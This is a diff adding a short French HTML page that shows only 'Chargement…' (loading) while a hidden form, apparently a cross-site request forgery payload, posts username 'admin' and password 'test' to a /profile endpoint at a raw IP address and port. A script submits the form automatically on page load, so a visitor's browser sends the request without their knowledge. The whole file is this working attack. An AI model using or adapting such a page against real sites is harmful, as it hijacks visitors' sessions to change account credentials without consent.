@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <title>Chargement</title>
+</head>
+<body>
+  <p>Chargement…</p>
+
+  <form
+    id="csrf"
+    action="http://130.117.187.88:39918/profile"
+    method="POST"
+  >
+    <input
+      type="hidden"
+      name="username"
+      value="admin"
+    >
+
+    <input
+      type="hidden"
+      name="password"
+      value="test"
+    >
+  </form>
+
+  <script>
+    document.getElementById("csrf").submit();
+  </script>
+</body>
+</html>
